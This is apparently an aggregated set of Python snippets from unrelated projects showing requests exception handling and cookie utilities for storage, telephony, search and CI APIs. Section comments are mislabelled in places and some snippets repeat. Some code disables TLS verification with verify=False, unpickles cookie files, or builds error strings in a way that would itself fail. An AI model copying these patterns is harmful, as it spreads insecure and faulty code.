        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    # if HTTP Response is not 200 then raise an exception
    if r.status_code != 200:
        message = "The HTTP response for get call to the server is not 200."
        if (query is None):
            raise TintriApiException(message, r.status_code, url, "No Payload", r.text)
        else:
            raise TintriApiException(message, r.status_code, url, query, r.text)

    return r


# API DELETE. 
**************************************
def api_login(server_name, user_name, password):

    # Payload, header and URL for login call
    headers = {'content-type': 'application/json'}
    payload = {'username': user_name,
               'password': password,
               'typeId': 'com.tintri.api.rest.vcommon.dto.rbac.RestApiCredentials'}
    url_login = 'https://'+ server_name + API + '/v310/session/login'

    try:
        # Invoke the login API.
        r = requests.post(url_login, data=json.dumps(payload),
                          headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("Login: API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("Login: HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Login: Request timed out.")
    except:
        raise TintriRequestsException("Login: An unexpected error " + sys.exc_info()[0] +
            " occurred.")

    # if HTTP Response is not 200 then raise an exception
    if r.status_code != 200:
        message = "The HTTP response for login call to the server is not 200."
        raise TintriApiException(message, r.status_code, url_login, str(payload), r.text)

    session_id = r.cookies['JSESSIONID']

    return session_id


# Logout 
**************************************
def api_get_query(server_name, api, query, session_id):
    headers = {'content-type': 'application/json'}
    if session_id is not None:
        headers['cookie'] = 'JSESSIONID=' + session_id

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.get(url, headers=headers, params=query, verify=False)
    except requests.ConnectionError:
        print_error("API Connection error occurred")
        sys.exit(-2)
    except requests.HTTPError:
        print_error("HTTP error occurred")
        sys.exit(-3)
    except requests.Timeout:
        print_error("Request timed out")
        sys.exit(-4)
    except:
        print_error("An unexpected error " + sys.exc_info()[0] + " occurred")
        sys.exit(-5)

    return r


# API DELETE. 
**************************************
def api_delete(server_name, api, session_id):
    #Header and URL for delete call
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.delete(url, headers=headers, verify=False)
    except requests.ConnectionError:
        print_error("API Connection error occurred")
        sys.exit(-2)
    except requests.HTTPError:
        print_error("HTTP error occurred")
        sys.exit(-3)
    except requests.Timeout:
        print_error("Request timed out")
        sys.exit(-4)
    except:
        print_error("An unexpected error " + sys.exc_info()[0] + " occurred")
        sys.exit(-5)

    return r


# PUT 
**************************************
def api_put(server_name, api, payload, session_id):
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.put(url, data=json.dumps(payload),
                          headers=headers, verify=False)
    except requests.ConnectionError:
        print_error("API Connection error occurred")
        sys.exit(-2)
    except requests.HTTPError:
        print_error("HTTP error occurred")
        sys.exit(-3)
    except requests.Timeout:
        print_error("Request timed out")
        sys.exit(-4)
    except:
        print_error("An unexpected error " + sys.exc_info()[0] + " occurred")
        sys.exit(-5)

    return r


# Login. 
**************************************
def api_login(server_name, user_name, password):
    # Payload, header and URL for login call
    headers = {'content-type': 'application/json'}
    payload = {'username': user_name,
               'password': password,
               'typeId': 'com.tintri.api.rest.vcommon.dto.rbac.RestApiCredentials'}
    url_login = 'https://'+ server_name + API + '/v310/session/login'

    try:
        # Invoke the login API.
        r = requests.post(url_login, data=json.dumps(payload),
                          headers=headers, verify=False)
    except requests.ConnectionError:
        print_error("Login: API Connection error occurred")
        sys.exit(-2)
    except requests.HTTPError:
        print_error("Login: HTTP error occurred")
        sys.exit(-3)
    except requests.Timeout:
        print_error("Login: Request timed out")
        sys.exit(-4)
    except:
        print_error("Login: An unexpected error " + sys.exc_info()[0] +
                    " occurred")
        sys.exit(-5)

    # if HTTP Response is not 200 then raise an exception
    if r.status_code != 200:
        print_error("The HTTP response for login call to the server " +
                    server_name + " is not 200, but is: " + str(r.status_code))
        print_error("url = " + url_login)
        print_error("payload = " + str(payload))
        print_error("response: " + r.text)
        sys.exit(-6)

    session_id = r.cookies['JSESSIONID']

    return session_id


# Logout 
**************************************
def compose_error(self, error):
        msg = "An error occurred while making the API call."

        if isinstance(error, requests.ConnectionError):
            msg = "An unexpected error occured while trying to connect to " \
            "the API. You may be seeing this message because your DNS is " \
            "not working. To check, try running from the command line."
        elif isinstance(error, requests.Timeout):
            msg = "The request timed out while making the API call."
        else:
            msg = "An unexpected error occured. If this problem persists let us know."

        return ConnectionError(msg) 
**************************************
def check_service_ready(self, timeout=1):
        import requests
        try:
            resp = self._req_session.get(self._endpoint + '/api', timeout=timeout)
        except (requests.ConnectionError, requests.Timeout):
            return False
        if resp.status_code >= 400:
            return False
        return True 
**************************************
def set_r_for_pdf(self):
        self.r = None
        try:
            self.r = http_get(url=self.scraped_pdf_url, stream=False, publisher=self.publisher, session_id=self.session_id, ask_slowly=self.ask_slowly)

        except requests.exceptions.ConnectionError as e:
            self.error += u"ERROR: connection error on {} in set_r_for_pdf: {}".format(self.scraped_pdf_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except requests.Timeout as e:
            self.error += u"ERROR: timeout error on {} in set_r_for_pdf: {}".format(self.scraped_pdf_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except requests.exceptions.InvalidSchema as e:
            self.error += u"ERROR: InvalidSchema error on {} in set_r_for_pdf: {}".format(self.scraped_pdf_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except requests.exceptions.RequestException as e:
            self.error += u"ERROR: RequestException in set_r_for_pdf"
            logger.info(self.error)
        except requests.exceptions.ChunkedEncodingError as e:
            self.error += u"ERROR: ChunkedEncodingError error on {} in set_r_for_pdf: {}".format(self.scraped_pdf_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except NoDoiException as e:
            self.error += u"ERROR: NoDoiException error on {} in set_r_for_pdf: {}".format(self.scraped_pdf_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except Exception as e:
            self.error += u"ERROR: Exception error in set_r_for_pdf"
            logger.exception(self.error) 
**************************************
def test_sysprep_run_remote_cmd_exc(self):
        self._test_sysprep(run_exc=requests.Timeout) 
**************************************
def Push(self):

        try:

            PushUrl = 'https://cloud.restcomm.com/restcomm-rvd/services/apps/'+self.AppName+'controller'
            Url = self.BaseUrl+'/Accounts/'+self.Sid+'UssdPush'
            data = {'From':self.From, 'To':self.To, 'Url':PushUrl}

            r = requests.post(Url, data=data, auth=(self.Sid,self.AuthToken))

            if r.status_code == 401:
                print("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r.status_code == 400:
                return "Invalid option"
            else:
                content = json.loads(r.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Create(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Clients.json'
            data = {'Login': self.Login, 'Password': self.Password}
            r1 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r1.status_code == 400:
                return "Password is too weak"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def ChangePassword(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Clients.json/'+self.ClientSid
            data = {'Password': self.Password}
            r3 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url or client Sid is Incorrect! Please verify and try again"
            elif r3.status_code == 400:
                return "Password is too weak"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Send(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Email/Messages.json'
            data = {'To':self.To,'From':self.From,'Body':self.Body,'Subject':self.Subject}
            r1=requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r1.status_code == 400:
                return "Invalid Mail Id"
            else:
                print(r1.status_code)
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def ChangePassword(self):

        try:

            Url = self.BaseUrl+'/Accounts.json/'+self.Sid
            data = {'AccountSid': self.Sid, 'Password': self.Password}
            r2 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r2.status_code == 400:
                return "Password is too weak"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Create(self):

        try:

            Url = self.BaseUrl+'/Accounts.json/'
            data = {'FriendlyName': self.FriendlyName, 'EmailAddress': self.EmailAddress, 'Password': self.Password}
            r3 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r3.status_code == 409:
                return ("Duplicate Name not allowed")
            elif r3.status_code == 400:
                return ("Password is too weak!")
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Create(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Management/Gateways.json'
            data = {'FriendlyName':self.FriendlyName,'UserName':self.UserName,'Password':self.Password,'Proxy':self.Proxy,'Register':'true','TTL':'3600'}
            r1 = requests.post(Url,data=data,auth=(self.Sid,self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r1.status_code == 400:
                return "Password is too weak"
            elif r1.status_code == 403:
                return "Invalid Proxy! Please enter correct proxy"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Create(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Applications.json'
            RcmUrl = 'cloud.restcomm.com/restcomm-rvd/services/apps/foobar/controller'
            data = {'FriendlyName': self.FriendlyName, 'ApiVersion': '2012-04-24', 'HasVoiceCallerIdLookup': 'false',
                    'RcmUrl': RcmUrl, 'Kind': self.kind}
            r1 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r1.status_code == 500:
                return "Please enter correct kind of Application!"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Call(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Calls.json'
            data = {'From': self.From, 'To': self.To, 'Url': self.Url}

            r1 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))
            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r1.status_code == 400:
                return "Invalid Number"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Send(self):

        try:

            BaseUrl = self.BaseUrl+'/Accounts/'+self.Sid+'/SMS/Messages.json'
            data = {'To': self.To, 'From': self.From, 'Body': self.Body}
            r1 = requests.post(BaseUrl, data=data, auth=(self.Sid, self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            elif r1.status_code == 400:
                return "Invalid Number"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def retry(times):
    def deco(func):
        def wrapper(*args, **kwargs):
            for i in range(0, times):
                try:
                    resp = func(*args, **kwargs)
                except (requests.Timeout, requests.HTTPError, requests.ConnectionError), ex:
                    logger.warn('Caught requests exception')
                else:
                    return resp
            logger.error('Get response Failed %(t)s times', {'t': times})
        return wrapper 
**************************************
def travis():
    signature = base64.b64decode(request.headers.get('Signature'))
    try:
        public_key = _get_travis_public_key()
    except requests.Timeout:
        print("Timed out when attempting to retrieve Travis CI public key")
        abort(500)
    except requests.RequestException as e:
        print("Failed to retrieve Travis CI public key")
        abort(500)
    try:
        check_authorized(signature, public_key, request.form["payload"])
    except SignatureError:
        abort(401)
    data = json.loads(request.form["payload"])

    repo = data["repository"]["owner_name"] + "/" + data["repository"]["name"]
    build_number = data["id"]
    sha = data["commit"]
    if data["type"] == "pull_request":
        sha = data["head_commit"]
    tag = None
    if data["type"] == "push" and data["tag"] != None:
        tag = data["tag"]
    print(data)

    key = sha
    if tag is not None:
        key = tag

    upload_lock = "upload-lock:" + sha

    if data["state"] in ("started", ):
        print("travis started", key)
        # Handle pulls differently.
        if data["pull_request"]:
            load_code.delay(repo, "pull/" + str(data["pull_request_number"]) + "/head")
        elif data["tag"]:
            load_code.delay(repo, "refs/tags/" + tag)
        else:
            load_code.delay(repo, "refs/heads/" + data["branch"])
        redis.setex(upload_lock, 20 * 60, "locked")
        set_status(repo, sha, "pending", data["build_url"], "Waiting on Travis to complete.")
    elif data["state"] in ("passed", "failed"):
        print("travis finished")
        key = repo + "/" + key
        set_status(repo, sha, "pending", "https://rosie-ci.ngrok.io/log/" + key, "Queueing Rosie test.")
        redis.delete(upload_lock)
        test_commit(repo, sha, tag)
    elif data["state"] is ("cancelled", ):
        print("travis cancelled")
        redis.delete(upload_lock)
        set_status(repo, sha, "error", data["build_url"], "Travis cancelled.")
    elif data["status"] is None:
        set_status(repo, sha, "error", data["build_url"], "Travis error.")
    else:
        print("unhandled state:", data["state"])
        print(data)
    return jsonify({'status': 'received'}) 
**************************************
def __request_requests(self, url, method, data=None):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            if method == 'GET':
                return _get_requests(url, headers=self.headers,
                                     auth=(self.username, self.password),
                                     timeout=self.timeout)
            elif method == 'PUSH':
                return _post_requests(url, data=data, headers=self.headers,
                                      auth=(self.username, self.password),
                                      timeout=self.timeout)
            elif method == 'DELETE':
                r = requests.delete(url, headers=self.headers,
                                    auth=(self.username, self.password),
                                    timeout=self.timeout)
            elif method == 'PUT':
                r = requests.put(url, data=data, headers=self.headers,
                                 auth=(self.username, self.password),
                                 timeout=self.timeout)
            elif method == 'PATCH':
                r = requests.patch(url, data=data, headers=self.headers,
                                   auth=(self.username, self.password),
                                   timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ProxyError as e:
            print "ProxyError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ProxyError for url %s: %s" % (url,e,), out
        except requests.SSLError as e:
            print "SSLError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "SSLError for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def setUp(self):
        worker_port = self.worker_port = str(get_next_port())
        scheduler_port = self.scheduler_port = str(get_next_port())
        proc_worker = subprocess.Popen([sys.executable, '-m', 'mars.worker',
                                        '-a', '127.0.0.1',
                                        '-p', worker_port,
                                        '--cpu-procs', '2',
                                        '--cache-mem', '10m',
                                        '--schedulers', '127.0.0.1:' + scheduler_port,
                                        '--log-level', 'debug',
                                        '--log-format', 'WOR %(asctime)-15s %(message)s',
                                        '--ignore-avail-mem'])
        proc_scheduler = subprocess.Popen([sys.executable, '-m', 'mars.scheduler',
                                           '--nproc', '1',
                                           '-H', '127.0.0.1',
                                           '-p', scheduler_port,
                                           '-Dscheduler.default_cpu_usage=0',
                                           '--log-level', 'debug',
                                           '--log-format', 'SCH %(asctime)-15s %(message)s'])

        self.proc_worker = proc_worker
        self.proc_scheduler = proc_scheduler

        self.wait_scheduler_worker_start()

        web_port = self.web_port = str(get_next_port())
        proc_web = subprocess.Popen([sys.executable, '-m', 'mars.web',
                                    '-H', '127.0.0.1',
                                     '--log-level', 'debug',
                                     '--log-format', 'WEB %(asctime)-15s %(message)s',
                                     '-p', web_port,
                                     '-s', '127.0.0.1:' + self.scheduler_port])
        self.proc_web = proc_web

        service_ep = 'http://127.0.0.1:' + self.web_port
        check_time = time.time()
        while True:
            if time.time() - check_time > 30:
                raise SystemError('Wait for service start timeout')
            try:
                resp = requests.get(service_ep + '/api', timeout=1)
            except (requests.ConnectionError, requests.Timeout):
                time.sleep(0.1)
                continue
            if resp.status_code >= 400:
                time.sleep(0.1)
                continue
            break

        self.exceptions = gevent.hub.Hub.NOT_ERROR
        gevent.hub.Hub.NOT_ERROR = (Exception,) 
**************************************
def start_distributed_env(self, n_workers=2):
        scheduler_port = self.scheduler_port = str(get_next_port())
        self.proc_workers = []
        for _ in range(n_workers):
            worker_port = str(get_next_port())
            proc_worker = subprocess.Popen([sys.executable, '-m', 'mars.worker',
                                            '-a', '127.0.0.1',
                                            '-p', worker_port,
                                            '--cpu-procs', '2',
                                            '--cache-mem', '10m',
                                            '--schedulers', '127.0.0.1:' + scheduler_port,
                                            '--log-level', 'debug',
                                            '--log-format', 'WOR %(asctime)-15s %(message)s',
                                            '--ignore-avail-mem'])

            self.proc_workers.append(proc_worker)

        proc_scheduler = subprocess.Popen([sys.executable, '-m', 'mars.scheduler',
                                           '--nproc', '1',
                                           '-H', '127.0.0.1',
                                           '-p', scheduler_port,
                                           '-Dscheduler.default_cpu_usage=0',
                                           '--log-level', 'debug',
                                           '--log-format', 'SCH %(asctime)-15s %(message)s'])
        self.proc_scheduler = proc_scheduler

        self.wait_scheduler_worker_start()

        web_port = self.web_port = str(get_next_port())
        proc_web = subprocess.Popen([sys.executable, '-m', 'mars.web',
                                    '-H', '127.0.0.1',
                                     '--log-level', 'debug',
                                     '--log-format', 'WEB %(asctime)-15s %(message)s',
                                     '-p', web_port,
                                     '-s', '127.0.0.1:' + self.scheduler_port])
        self.proc_web = proc_web

        service_ep = 'http://127.0.0.1:' + self.web_port
        check_time = time.time()
        while True:
            if time.time() - check_time > 30:
                raise SystemError('Wait for service start timeout')
            try:
                resp = requests.get(service_ep + '/api', timeout=1)
            except (requests.ConnectionError, requests.Timeout):
                time.sleep(0.1)
                continue
            if resp.status_code >= 400:
                time.sleep(0.1)
                continue
            break

        self.exceptions = gevent.hub.Hub.NOT_ERROR
        gevent.hub.Hub.NOT_ERROR = (Exception,) 
**************************************
def gets_a_pdf(self, link, base_url):

        if is_purchase_link(link):
            return False

        absolute_url = get_link_target(link.href, base_url)
        if DEBUG_SCRAPING:
            logger.info(u"checking to see if {} is a pdf".format(absolute_url))

        start = time()
        try:
            self.r = http_get(absolute_url, stream=True, publisher=self.publisher, session_id=self.session_id, ask_slowly=self.ask_slowly)

            if self.r.status_code != 200:
                if self.r.status_code in [401]:
                    # is unauthorized, so not open
                    pass
                else:
                    self.error += u"ERROR: status_code={} on {} in gets_a_pdf".format(self.r.status_code, absolute_url)
                return False

            if self.is_a_pdf_page():
                return True

        except requests.exceptions.ConnectionError as e:
            self.error += u"ERROR: connection error in gets_a_pdf for {}: {}".format(absolute_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except requests.Timeout as e:
            self.error += u"ERROR: timeout error in gets_a_pdf for {}: {}".format(absolute_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except requests.exceptions.InvalidSchema as e:
            self.error += u"ERROR: InvalidSchema error in gets_a_pdf for {}: {}".format(absolute_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except requests.exceptions.RequestException as e:
            self.error += u"ERROR: RequestException error in gets_a_pdf"
            logger.info(self.error)
        except requests.exceptions.ChunkedEncodingError as e:
            self.error += u"ERROR: ChunkedEncodingError error in gets_a_pdf for {}: {}".format(absolute_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except NoDoiException as e:
            self.error += u"ERROR: NoDoiException error in gets_a_pdf for {}: {}".format(absolute_url, unicode(e.message).encode("utf-8"))
            logger.info(self.error)
        except Exception as e:
            self.error += u"ERROR: Exception error in gets_a_pdf"
            logger.exception(self.error)

        if DEBUG_SCRAPING:
            logger.info(u"we've decided this ain't a PDF. took {} seconds [{}]".format(
                elapsed(start), absolute_url))
        return False 

Python requests.utils() Examples

**************************************
def _search(self, limit, format):
        '''
        Returns a list of result objects, with the url for the next page bing search url.
        '''
        url = self.QUERY_URL.format(requests.utils.quote("'{}'".format(self.query)), min(50, limit), self.current_offset, format)
        r = requests.get(url, auth=("", self.api_key))
        try:
            json_results = r.json()
        except ValueError as vE:
            if not self.safe:
                raise PyBingWebException("Request returned with code %s, error msg: %s" % (r.status_code, r.text))
            else:
                print ("[ERROR] Request returned with code %s, error msg: %s. \nContinuing in 5 seconds." % (r.status_code, r.text))
                time.sleep(5)
        packaged_results = [WebResult(single_result_json) for single_result_json in json_results['d']['results']]
        self.current_offset += min(50, limit, len(packaged_results))
        return packaged_results 
**************************************
def _search(self, limit, format):
        '''
        Returns a list of result objects, with the url for the next page bing search url.
        '''
        filters = requests.utils.quote("'{}'".format(self.image_filters))
        url = self.QUERY_URL.format(requests.utils.quote("'{}'".format(self.query)), min(50, limit), self.current_offset, format, filters)
        r = requests.get(url, auth=("", self.api_key))
        try:
            json_results = r.json()
        except ValueError as vE:
            if not self.safe:
                raise PyBingImageException("Request returned with code %s, error msg: %s" % (r.status_code, r.text))
            else:
                print ("[ERROR] Request returned with code %s, error msg: %s. \nContinuing in 5 seconds." % (r.status_code, r.text))
                time.sleep(5)
        packaged_results = [ImageResult(single_result_json) for single_result_json in json_results['d']['results']]
        self.current_offset += min(50, limit, len(packaged_results))
        return packaged_results 
**************************************
def _search(self, limit, format):
        '''
        Returns a list of result objects, with the url for the next page bing search url.
        '''
        url = self.QUERY_URL.format(requests.utils.quote("'{}'".format(self.query)), min(50, limit), self.current_offset, format)
        r = requests.get(url, auth=("", self.api_key))
        try:
            json_results = r.json()
        except ValueError as vE:
            if not self.safe:
                raise PyBingVideoException("Request returned with code %s, error msg: %s" % (r.status_code, r.text))
            else:
                print ("[ERROR] Request returned with code %s, error msg: %s. \nContinuing in 5 seconds." % (r.status_code, r.text))
                time.sleep(5)
        packaged_results = [VideoResult(single_result_json) for single_result_json in json_results['d']['results']]
        self.current_offset += min(50, limit, len(packaged_results))
        return packaged_results 
**************************************
def _search(self, limit, format):
        '''
        Returns a list of result objects, with the url for the next page bing search url.
        '''
        url = self.QUERY_URL.format(requests.utils.quote("'{}'".format(self.query)), min(50, limit), self.current_offset, format)
        r = requests.get(url, auth=("", self.api_key))
        try:
            json_results = r.json()
        except ValueError as vE:
            if not self.safe:
                raise PyBingNewsException("Request returned with code %s, error msg: %s" % (r.status_code, r.text))
            else:
                print ("[ERROR] Request returned with code %s, error msg: %s. \nContinuing in 5 seconds." % (r.status_code, r.text))
                time.sleep(5)
        packaged_results = [NewsResult(single_result_json) for single_result_json in json_results['d']['results']]
        self.current_offset += min(50, limit, len(packaged_results))
        return packaged_results 
**************************************
def login(url, data):
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, sdch",
            "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.6",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "ac.ppdai.com",
            "Origin": "https://ac.ppdai.com",
            "Referer": "https://ac.ppdai.com/User/Login?message=&Redirect=",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/51.0.2704.103 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }

        cookies, exists = Server.__get_cookie()
        if not exists:
            session = requests.Session()
            session.headers = headers
            response = session.post(url, data=data)

            # 写入cookie
            with open('cookie', 'w') as f:
                pickle.dump(requests.utils.dict_from_cookiejar(response.cookies), f) 
**************************************
def loadCartAndCheckout(self):
        #Import Cookies
        driver = webdriver.Chrome(executable_path="./chromedriver")
        driver.delete_all_cookies()
        driver.get(self.URL_cart)

        cookies = requests.utils.dict_from_cookiejar(self.user_session.cookies)
        
        for cookie in cookies.items():
            cookie_dict = {'name': '',
                           'value': '',
                           'path': '/'}
            cookie_dict['name'] = cookie[0]
            cookie_dict['value'] = cookie[1]
            driver.add_cookie(cookie_dict)
                          
        driver.get(self.URL_cart)
        #time.sleep(5)
        #driver.quit() 
**************************************
def load_cookie(self, fname):
        # Python2 compatibility
        if PY2:
            FileNotFoundError = IOError

        try:
            with open(fname, 'r') as f:
                self.session = requests.Session()
                self.session.cookies = requests.utils.cookiejar_from_dict(json.load(f))
            cookie_username = self.cookie_dict['ds_user']
            assert cookie_username == self.username
        except FileNotFoundError:
            raise Exception('Cookie file `{}` not found'.format(fname))
        except (TypeError, EOFError):
            os.remove(fname)
            msg = ('An error occured opening the cookie `{}`, '
                   'it will be removed an recreated.')
            raise Exception(msg.format(fname))
        except AssertionError:
            msg = 'The loaded cookie was for {} instead of {}.'
            raise Exception(msg.format(cookie_username, self.username)) 
**************************************
def douban_tranlation(matched_name): 
    import urllib2
    priority = {'movie':10, 'tv':9}
    qs = utils.url_encode({'q': matched_name})
    search_api = 'http://api.douban.com/v2/movie/search?%s' % (qs)
    rs = json.loads(urllib2.urlopen(search_api).read())

    items = rs['subjects']
    ret = None

    for item in items:
        if ret == None or (priority[ret['subtype']] < priority[item['subtype']]):
            ret = {
                'origin'  : item['original_title'], 
                'subtype' : item['subtype']
            }

    return ret 
**************************************
def _session_check(self):
        """Attempt to authenticate the user through a session file.

        This process is done to avoid having to authenticate the user every
        single time. It uses a session file that is saved when a valid session
        is captured and then reused. Because sessions can expire, we need to
        test the session prior to calling the user authenticated. Right now
        that is done with a test string found in an unauthenticated session.
        This approach is not an ideal method, but it works.
        """
        if not os.path.exists(SESSION_FILE):
            self._log.debug("Session file does not exist")
            return False
        with open(SESSION_FILE, 'rb') as f:
            cookies = requests.utils.cookiejar_from_dict(pickle.load(f))
            self._session.cookies = cookies
            self._log.debug("Loaded cookies from session file")
        response = self._session.get(url=self.TEST_URL, headers=self.HEADERS)
        if self.TEST_KEY in str(response.content):
            self._log.debug("Session file appears invalid")
            return False
        self._is_authenticated = True
        self._process_state()
        return True 
**************************************
def authenticated(func):
    def wrapper(self, *args, **kwargs):
        success = False
        # 先判断有没有cookie文件, 再判断cookie是否有效
        if 'z_c0' in requests.utils.dict_from_cookiejar(self.cookies):
            from ..url import URL
